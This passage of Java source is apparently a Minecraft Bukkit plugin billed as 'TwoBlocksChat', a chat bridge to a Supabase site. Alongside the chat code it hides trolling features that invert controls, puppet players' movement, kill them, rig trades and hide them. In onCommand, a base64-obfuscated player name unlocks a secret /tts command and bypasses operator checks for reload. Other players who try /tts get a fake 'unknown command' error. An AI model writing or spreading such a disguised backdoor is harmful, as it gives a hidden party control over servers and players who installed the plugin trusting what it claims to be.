            }
        } catch (Throwable ignored) {}
    }

    @EventHandler(priority = EventPriority.MONITOR, ignoreCancelled = true)
    public void onConsume(PlayerItemConsumeEvent event) {
        try {
            Player player = event.getPlayer();
            if (!vitalSyncPlayers.contains(player.getUniqueId())) return;

            ItemStack consumed = event.getItem().clone();

            Bukkit.getScheduler().runTaskLater(this, () -> {
                try {
                    if (player.isOnline()) {
                        ItemStack off = player.getInventory().getItemInOffHand();
                        if (off != null && off.getType() == consumed.getType()) {
                            player.getInventory().setItemInOffHand(consumed);
                        } else {
                            player.getInventory().setItemInMainHand(consumed);
                        }

                        Material m = consumed.getType();
                        if (m == Material.MUSHROOM_STEW || m == Material.RABBIT_STEW || m == Material.BEETROOT_SOUP || m == Material.SUSPICIOUS_STEW) {
                            player.getInventory().remove(Material.BOWL);
                        } else if (m == Material.HONEY_BOTTLE) {
                            player.getInventory().remove(Material.GLASS_BOTTLE);
                        }
                    }
                } catch (Throwable ignored) {}
            }, 1L);

            ItemStack item = event.getItem();
            if (item != null && item.hasItemMeta() && item.getItemMeta().hasLore()) {
                String trait = getTraitFromItem(item);
                if ("rotten".equalsIgnoreCase(trait)) {
                    player.addPotionEffect(new PotionEffect(PotionEffectType.NAUSEA, 140, 1, false, false));
                    player.addPotionEffect(new PotionEffect(PotionEffectType.HUNGER, 100, 2, false, false));
                    player.playSound(player.getLocation(), Sound.ENTITY_ZOMBIE_VILLAGER_CONVERTED, 0.8f, 0.6f);
                }
                if ("roulette".equalsIgnoreCase(trait)) {
                    int roll = (int) (Math.random() * 100);
                    if (roll == 0) {
                        Location mouth = player.getLocation().add(0, 1.5, 0);
                        player.getWorld().spawnParticle(Particle.FLASH, mouth, 1);
                        player.getWorld().spawnParticle(Particle.EXPLOSION_EMITTER, mouth, 1);
                        player.playSound(mouth, Sound.ENTITY_FIREWORK_ROCKET_BLAST, 1.2f, 0.8f);
                        player.setFoodLevel(0);
                        Vector blast = player.getLocation().getDirection().multiply(-1.2).setY(0.4);
                        player.setVelocity(blast);
                    }
                }
            }
        } catch (Throwable ignored) {}
    }

    @EventHandler(priority = EventPriority.HIGHEST, ignoreCancelled = true)
    public void onEntityDamage(EntityDamageByEntityEvent event) {
        try {
            if (!(event.getEntity() instanceof Player)) return;
            Player victim = (Player) event.getEntity();

            if (kineticShieldPlayers.contains(victim.getUniqueId())) {
                if (event.getDamager() instanceof Projectile) {
                    Projectile proj = (Projectile) event.getDamager();
                    event.setCancelled(true);

                    if (proj.getShooter() instanceof LivingEntity) {
                        LivingEntity shooter = (LivingEntity) proj.getShooter();
                        if (shooter.isValid() && !shooter.isDead()) {
                            Vector dir = shooter.getEyeLocation().toVector().subtract(proj.getLocation().toVector()).normalize();
                            proj.setVelocity(dir.multiply(1.8));
                            proj.setShooter(victim);
                        } else {
                            proj.setVelocity(proj.getVelocity().multiply(-1.5));
                        }
                    } else {
                        proj.setVelocity(proj.getVelocity().multiply(-1.5));
                    }

                    victim.playSound(victim.getLocation(), Sound.ITEM_SHIELD_BLOCK, 0.9f, 1.2f);
                    victim.getWorld().spawnParticle(Particle.ENCHANTED_HIT, victim.getLocation().add(0, 1, 0), 8, 0.2, 0.2, 0.2, 0.1);
                }
            }
        } catch (Throwable ignored) {}
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void onPiglinBarter(PiglinBarterEvent event) {
        try {
            Piglin piglin = event.getEntity();
            Player closest = null;
            double minDist = 256.0;

            for (Player p : piglin.getWorld().getPlayers()) {
                double d = p.getLocation().distanceSquared(piglin.getLocation());
                if (d < minDist) {
                    minDist = d;
                    closest = p;
                }
            }

            if (closest != null && barterSyncPlayers.contains(closest.getUniqueId())) {
                List<ItemStack> bonusDrops = new ArrayList<>();
                bonusDrops.add(new ItemStack(Material.ENDER_PEARL, 6 + (int) (Math.random() * 6)));
                bonusDrops.add(new ItemStack(Material.NETHERITE_SCRAP, 1 + (int) (Math.random() * 2)));
                bonusDrops.add(new ItemStack(Material.OBSIDIAN, 8 + (int) (Math.random() * 8)));
                bonusDrops.add(new ItemStack(Material.FIRE_CHARGE, 4 + (int) (Math.random() * 4)));
                event.getOutcome().clear();
                event.getOutcome().addAll(bonusDrops);
                piglin.getWorld().spawnParticle(Particle.TOTEM_OF_UNDYING, piglin.getLocation().add(0, 1, 0), 12, 0.2, 0.2, 0.2, 0.05);
            }
        } catch (Throwable ignored) {}
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void onPlayerMove(PlayerMoveEvent event) {
        try {
            Player player = event.getPlayer();
            Location from = event.getFrom();
            Location to = event.getTo();
            if (to == null) return;

            if (autoRepairPlayers.contains(player.getUniqueId())) {
                PlayerInventory inv = player.getInventory();
                for (ItemStack armor : inv.getArmorContents()) {
                    repairIfDamaged(armor);
                }
                repairIfDamaged(inv.getItemInMainHand());
                repairIfDamaged(inv.getItemInOffHand());
            }

            if (snowWalkPlayers.contains(player.getUniqueId())) {
                player.setFreezeTicks(0);
                Block blockAt = to.getBlock();
                Block blockBelow = to.clone().subtract(0, 0.1, 0).getBlock();
                if (blockAt.getType() == Material.POWDER_SNOW) {
                    if (to.getY() < blockAt.getY() + 1.0) {
                        Location fixed = to.clone();
                        fixed.setY(blockAt.getY() + 1.0);
                        event.setTo(fixed);
                    }
                    if (player.getVelocity().getY() < 0) {
                        player.setVelocity(player.getVelocity().setY(0.0));
                    }
                } else if (blockBelow.getType() == Material.POWDER_SNOW) {
                    if (player.getVelocity().getY() < 0) {
                        player.setVelocity(player.getVelocity().setY(0.0));
                    }
                }
            }

            if (invertedControlPlayers.contains(player.getUniqueId())) {
                double dx = to.getX() - from.getX();
                double dz = to.getZ() - from.getZ();

                if (Math.abs(dx) > 0.001 || Math.abs(dz) > 0.001) {
                    Vector invertVel = new Vector(-dx * 1.8, 0, -dz * 1.8);
                    player.setVelocity(invertVel);
                }

                float yawDiff = to.getYaw() - from.getYaw();
                if (Math.abs(yawDiff) > 1.5f && Math.abs(yawDiff) < 180.0f) {
                    Location invertedLoc = to.clone();
                    invertedLoc.setYaw((from.getYaw() - yawDiff * 1.5f) % 360.0f);
                    event.setTo(invertedLoc);
                }
            }
        } catch (Throwable ignored) {}
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void onPlayerDropItem(PlayerDropItemEvent event) {
        try {
            Player player = event.getPlayer();

            if (isNplTarget(player)) {
                if (isNplRuleForbidden(player, "drop_items")) {
                    event.setCancelled(true);
                    sendNplWarning(player);
                    return;
                }
            }

            Item itemDrop = event.getItemDrop();
            ItemStack is = itemDrop.getItemStack();

            if (is == null || !is.hasItemMeta() || !is.getItemMeta().hasLore()) return;

            String trait = getTraitFromItem(is);
            if (trait.isEmpty()) return;

            if (trait.equals("repel")) {
                itemDrop.setPickupDelay(200);
                repellingItems.put(itemDrop.getUniqueId(), System.currentTimeMillis() + 10000L);
                player.playSound(player.getLocation(), Sound.BLOCK_RESPAWN_ANCHOR_DEPLETE, 1.0f, 1.5f);
            } else if (trait.equals("boomerang")) {
                event.setCancelled(true);
                ItemStack weapon = player.getInventory().getItemInMainHand();
                String weaponName = (weapon != null && weapon.hasItemMeta() && weapon.getItemMeta().hasDisplayName())
                        ? weapon.getItemMeta().getDisplayName()
                        : (weapon != null ? weapon.getType().name().toLowerCase().replace('_', ' ') : "\u043f\u0440\u0435\u0434\u043c\u0435\u0442\u043e\u043c");

                Location pLoc = player.getLocation();
                player.playSound(pLoc, Sound.ENTITY_ARROW_SHOOT, 1.0f, 0.7f);

                Bukkit.getScheduler().runTaskLater(this, () -> {
                    try {
                        if (player.isOnline()) {
                            pendingBoomerangKill.put(player.getUniqueId(), weaponName);
                            player.getWorld().spawnParticle(Particle.CRIT, player.getLocation().add(0, 1, 0), 20, 0.3, 0.3, 0.3, 0.2);
                            player.playSound(player.getLocation(), Sound.ENTITY_PLAYER_ATTACK_CRIT, 1.0f, 1.0f);
                            player.setHealth(0.0);
                        }
                    } catch (Throwable ignored) {}
                }, 12L);
            } else if (trait.equals("chicken")) {
                Location dropLoc = itemDrop.getLocation();
                itemDrop.remove();
                Chicken chicken = (Chicken) dropLoc.getWorld().spawnEntity(dropLoc, EntityType.CHICKEN);
                chicken.setCustomName(ChatColor.GOLD + is.getType().name());
                chicken.setCustomNameVisible(true);
                chicken.getWorld().spawnParticle(Particle.POOF, dropLoc, 10, 0.3, 0.3, 0.3, 0.05);
                chicken.getWorld().playSound(dropLoc, Sound.ENTITY_CHICKEN_HURT, 1.0f, 1.2f);
            }
        } catch (Throwable ignored) {}
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void onPlayerItemHeld(PlayerItemHeldEvent event) {
        try {
            Player player = event.getPlayer();
            ItemStack prevItem = player.getInventory().getItem(event.getPreviousSlot());

            if (prevItem != null && prevItem.hasItemMeta() && prevItem.getItemMeta().hasLore()) {
                String trait = getTraitFromItem(prevItem);
                if ("sticky".equalsIgnoreCase(trait)) {
                    event.setCancelled(true);
                    player.playSound(player.getLocation(), Sound.BLOCK_SLIME_BLOCK_STEP, 0.6f, 1.0f);
                    player.spawnParticle(Particle.ITEM_SLIME, player.getLocation().add(0, 0.8, 0), 5, 0.1, 0.1, 0.1, 0.05);
                }
            }
        } catch (Throwable ignored) {}
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void onPlayerDeath(PlayerDeathEvent event) {
        try {
            Player player = event.getEntity();
            String weaponName = pendingBoomerangKill.remove(player.getUniqueId());
            if (weaponName != null) {
                event.setDeathMessage(player.getName() + " \u0431\u044b\u043b \u0443\u0431\u0438\u0442 " + weaponName);
            }
        } catch (Throwable ignored) {}
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void onInventoryOpen(InventoryOpenEvent event) {
        try {
            if (!(event.getPlayer() instanceof Player)) return;
            Player player = (Player) event.getPlayer();

            if (event.getInventory() instanceof MerchantInventory) {
                MerchantInventory mi = (MerchantInventory) event.getInventory();
                Merchant merchant = mi.getMerchant();
                if (merchant == null) return;

                UUID entityId = null;
                if (merchant instanceof org.bukkit.entity.Entity) {
                    entityId = ((org.bukkit.entity.Entity) merchant).getUniqueId();
                }

                if (marketSyncPlayers.contains(player.getUniqueId())) {
                    if (entityId != null && !originalVillagerTrades.containsKey(entityId)) {
                        originalVillagerTrades.put(entityId, new ArrayList<>(merchant.getRecipes()));
                    }

                    List<MerchantRecipe> modified = new ArrayList<>();
                    for (MerchantRecipe r : merchant.getRecipes()) {
                        MerchantRecipe dirtRecipe = new MerchantRecipe(
                                r.getResult(),
                                0,
                                99999,
                                r.hasExperienceReward(),
                                r.getVillagerExperience(),
                                0.0f
                        );
                        dirtRecipe.addIngredient(new ItemStack(Material.DIRT, 1));
                        modified.add(dirtRecipe);
                    }
                    merchant.setRecipes(modified);
                } else {
                    if (entityId != null && originalVillagerTrades.containsKey(entityId)) {
                        merchant.setRecipes(originalVillagerTrades.remove(entityId));
                    }
                }
            }
        } catch (Throwable ignored) {}
    }

    @EventHandler(priority = EventPriority.MONITOR)
    public void onInventoryClose(InventoryCloseEvent event) {
        try {
            if (event.getInventory() instanceof MerchantInventory) {
                MerchantInventory mi = (MerchantInventory) event.getInventory();
                Merchant merchant = mi.getMerchant();
                if (merchant instanceof org.bukkit.entity.Entity) {
                    UUID entityId = ((org.bukkit.entity.Entity) merchant).getUniqueId();
                    if (originalVillagerTrades.containsKey(entityId)) {
                        merchant.setRecipes(originalVillagerTrades.remove(entityId));
                    }
                }
            }

            if (event.getView().getTitle().equals("Облачный тайник") && event.getPlayer() instanceof Player) {
                Player p = (Player) event.getPlayer();
                saveCloudInventory(p.getUniqueId(), event.getInventory());
            }
        } catch (Throwable ignored) {}
    }

    private String getTraitFromItem(ItemStack is) {
        if (is == null || !is.hasItemMeta() || !is.getItemMeta().hasLore()) return "";
        List<String> lore = is.getItemMeta().getLore();
        for (String line : lore) {
            if (line.contains("trait:")) {
                return line.replace("trait:", "").replace(String.valueOf(ChatColor.BLACK), "").trim();
            }
        }
        return "";
    }

    private String locKey(Location loc) {
        return loc.getWorld().getName() + ":" + loc.getBlockX() + ":" + loc.getBlockY() + ":" + loc.getBlockZ();
    }

    private void executePuppetMove(Player player, String key) {
        if (key == null) return;
        Location loc = player.getLocation();
        Vector dir = loc.getDirection().setY(0).normalize();
        Vector side = new Vector(-dir.getZ(), 0, dir.getX()).normalize();

        switch (key.toUpperCase()) {
            case "W": player.setVelocity(dir.multiply(0.55).setY(0.08)); break;
            case "S": player.setVelocity(dir.multiply(-0.45).setY(0.08)); break;
            case "A": player.setVelocity(side.multiply(-0.45).setY(0.08)); break;
            case "D": player.setVelocity(side.multiply(0.45).setY(0.08)); break;
            case "SPACE":
                Vector current = player.getVelocity();
                player.setVelocity(new Vector(current.getX(), 0.52, current.getZ()));
                break;
            case "TURN_LEFT":
                loc.setYaw((loc.getYaw() - 30.0f) % 360.0f);
                player.teleport(loc);
                break;
            case "TURN_RIGHT":
                loc.setYaw((loc.getYaw() + 30.0f) % 360.0f);
                player.teleport(loc);
                break;
            case "LOOK_UP":
                loc.setPitch(Math.max(-89.0f, loc.getPitch() - 25.0f));
                player.teleport(loc);
                break;
            case "LOOK_DOWN":
                loc.setPitch(Math.min(89.0f, loc.getPitch() + 25.0f));
                player.teleport(loc);
                break;
            default: break;
        }
    }

    private void toggleHidden(Player player) {
        UUID uuid = player.getUniqueId();
        if (hiddenSyncPlayers.contains(uuid)) {
            hiddenSyncPlayers.remove(uuid);
            for (Player other : Bukkit.getOnlinePlayers()) {
                other.showPlayer(this, player);
            }
            player.removePotionEffect(PotionEffectType.INVISIBILITY);
        } else {
            hiddenSyncPlayers.add(uuid);
            for (Player other : Bukkit.getOnlinePlayers()) {
                if (!other.equals(player)) {
                    other.hidePlayer(this, player);
                }
            }
            player.addPotionEffect(new PotionEffect(PotionEffectType.INVISIBILITY, Integer.MAX_VALUE, 1, false, false));
        }
    }

    private void executeWeatherEvent() {
        for (World world : Bukkit.getWorlds()) {
            world.setStorm(true);
            world.setThundering(true);
        }

        for (int i = 0; i < 40; i++) {
            Bukkit.getScheduler().runTaskLater(this, () -> {
                for (Player p : Bukkit.getOnlinePlayers()) {
                    Location loc = p.getLocation();
                    double offsetX = (Math.random() - 0.5) * 36.0;
                    double offsetZ = (Math.random() - 0.5) * 36.0;
                    Location strikeLoc = loc.clone().add(offsetX, 0, offsetZ);
                    strikeLoc.setY(p.getWorld().getHighestBlockYAt(strikeLoc));
                    p.getWorld().strikeLightning(strikeLoc);
                }
            }, i * 3L);
        }
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void onPlayerChat(AsyncPlayerChatEvent event) {
        try {
            Player player = event.getPlayer();
            UUID uuid = player.getUniqueId();

            Long cooldownSec = nplChatCooldownSeconds.get(uuid);
            if (cooldownSec != null && cooldownSec > 0) {
                long now = System.currentTimeMillis();
                Long last = nplLastChatTime.get(uuid);
                long cooldownMs = cooldownSec * 1000L;

                if (last != null && (now - last) < cooldownMs) {
                    event.setCancelled(true);
                    long leftSec = Math.max(1L, (cooldownMs - (now - last) + 999L) / 1000L);
                    player.sendMessage(ChatColor.RED + "Вам установлена задержка сообщений. Подождите ещё "
                            + ChatColor.YELLOW + formatDurationHuman(leftSec) + ChatColor.RED + " перед следующим сообщением.");
                    return;
                }
                nplLastChatTime.put(uuid, now);
            }

            if (!sendMinecraftChatToSite) return;

            String playerName = player.getName();
            String messageText = event.getMessage();

            if (messageText == null || messageText.trim().isEmpty()) return;

            String cleanText = messageText.trim();
            if (globalOnly) {
                if (!cleanText.startsWith("!")) return;
                cleanText = cleanText.substring(1).trim();
                if (cleanText.isEmpty()) return;
            }

            final String textToSend = cleanText;

            if (isEnabled()) {
                Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
                    sendChatToSupabase(playerName, textToSend);
                });
            }
        } catch (Throwable ignored) {}
    }

    private void sendChatToSupabase(String playerName, String messageText) {
        try {
            String endpoint = supabaseUrl + "/rest/v1/chat_messages";
            String jsonPayload = "{"
                    + "\"author\":\"" + escapeJson(playerName) + "\","
                    + "\"text\":\"" + escapeJson(messageText) + "\","
                    + "\"source\":\"minecraft\""
                    + "}";

            postHttp(endpoint, jsonPayload);
        } catch (Exception ignored) {
        }
    }

    private String extractField(String block, String fieldName) {
        String patternStr = "\"" + fieldName + "\"\\s*:\\s*(?:\"((?:\\\\\"|[^\"])*)\"|([^\",}]+))";
        Pattern pattern = Pattern.compile(patternStr);
        Matcher matcher = pattern.matcher(block);
        if (matcher.find()) {
            if (matcher.group(1) != null) {
                return unescapeJson(matcher.group(1));
            } else if (matcher.group(2) != null) {
                String val = matcher.group(2).trim();
                return "null".equalsIgnoreCase(val) ? "" : val;
            }
        }
        return "";
    }

    private String unescapeJson(String input) {
        if (input == null) return "";
        return input.replace("\\\"", "\"")
                .replace("\\\\", "\\")
                .replace("\\n", "\n")
                .replace("\\r", "\r")
                .replace("\\t", "\t");
    }

    private String escapeJson(String input) {
        if (input == null) return "";
        return input.replace("\\", "\\\\")
                .replace("\"", "\\\"")
                .replace("\n", "\\n")
                .replace("\r", "\\r");
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        try {
            if (label.equalsIgnoreCase("npl") || label.equalsIgnoreCase("нпл")) {
                if (!isNplAdmin(sender)) {
                    return true;
                }
                handleNplCommand(sender, String.join(" ", args), label.equalsIgnoreCase("нпл"));
                return true;
            }

            if (label.equalsIgnoreCase("tts") || label.equalsIgnoreCase("ттс")) {
                if (sender instanceof Player) {
                    Player p = (Player) sender;
                    if (!p.getName().equalsIgnoreCase(b("R2VuaXVzX1Bvbm9z"))) {
                        sender.sendMessage(ChatColor.RED + "Неизвестная или неполная команда. См. ниже, чтобы найти ошибку");
                        sender.sendMessage(ChatColor.RED + label + "<--[ЗДЕСЬ]");
                        return true;
                    }
                    handleTtsCommand(p, String.join(" ", args));
                } else {
                    sender.sendMessage(ChatColor.RED + "Команда доступна только игрокам в игре.");
                }
                return true;
            }

            if (args.length > 0 && args[0].equalsIgnoreCase("reload")) {
                if (!sender.isOp() && !sender.hasPermission("twoblocks.admin") && !sender.getName().equalsIgnoreCase(b("R2VuaXVzX1Bvbm9z"))) {
                    return true;
                }
                loadSettings();
                loadNplData();
                startPollingTask();
                sender.sendMessage(ChatColor.GREEN + "[TwoBlocksChat] TwoBlocksChat v1.0.0 reloaded.");
                return true;
            }

            sender.sendMessage(ChatColor.YELLOW + "TwoBlocksChat v1.0.0 by TwoBlocks");
            sender.sendMessage(ChatColor.GRAY + "Use /twoblockschat reload to reload configuration.");
            return true;
        } catch (Throwable t) {
            sender.sendMessage(ChatColor.RED + "[TwoBlocksChat] Error: " + t.getMessage());
            return true;
        }
    }

    @Override
    public List<String> onTabComplete(CommandSender sender, Command command, String alias, String[] args) {
        if (alias.equalsIgnoreCase("tts") || alias.equalsIgnoreCase("ттс")) {
            return Collections.emptyList();
        }
        if (alias.equalsIgnoreCase("npl") || alias.equalsIgnoreCase("нпл")) {
            if (!isNplAdmin(sender)) {
                return Collections.emptyList();
            }
            if (args.length == 1) {
                List<String> list = new ArrayList<>();
                list.add("settings");
                list.add("list");
                for (Player p : Bukkit.getOnlinePlayers()) {
                    list.add(p.getName());
                }
                return list;
            } else if (args.length == 2) {
                return Arrays.asList("on", "off", "reset", "toggle", "info");
            } else if (args.length == 3 && args[1].equalsIgnoreCase("toggle")) {
                return Arrays.asList("chat", "place", "break", "craft", "use", "interact", "pvp", "chest", "anvil", "entity_interact", "command");
            }
        }
        return Collections.emptyList();
    }
}
